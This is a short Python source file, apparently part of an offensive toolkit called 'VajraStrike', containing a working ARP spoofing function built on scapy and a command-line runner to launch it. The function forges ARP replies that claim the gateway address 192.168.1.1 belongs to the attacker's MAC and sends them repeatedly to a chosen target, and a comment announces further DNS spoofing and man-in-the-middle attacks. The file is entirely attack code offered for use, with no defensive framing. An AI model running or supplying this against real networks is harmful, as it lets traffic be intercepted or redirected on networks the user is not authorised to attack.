# VajraStrike network_attacks.py updated with safe ASCII for Windows terminals

def arp_spoof(target_ip, interface):
    import time
    from scapy.all import ARP, send, get_if_hwaddr

    print(f"[*] Starting ARP Spoof against {target_ip} on {interface}")

    attacker_mac = get_if_hwaddr(interface)

    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc="192.168.1.1", hwsrc=attacker_mac)

    try:
        for _ in range(10):
            send(packet, verbose=False, iface=interface)
            print(f"[+] Sent ARP spoof packet to {target_ip}")
            time.sleep(1)
        print("[!] ARP Spoofing stopped.")

    except KeyboardInterrupt:
        print("[!] Attack interrupted by user.")

# Additional attacks like dns_spoof, mitm_suite to be implemented similarly

# Example CLI runner if needed
def main():
    import argparse

    parser = argparse.ArgumentParser(description="VajraStrike Network Attacks")
    parser.add_argument("--attack", choices=["arp_spoof"], required=True)
    parser.add_argument("--target", required=True)
    parser.add_argument("--interface", required=True)

    args = parser.parse_args()

    if args.attack == "arp_spoof":
        arp_spoof(args.target, args.interface)

if __name__ == "__main__":
    main()
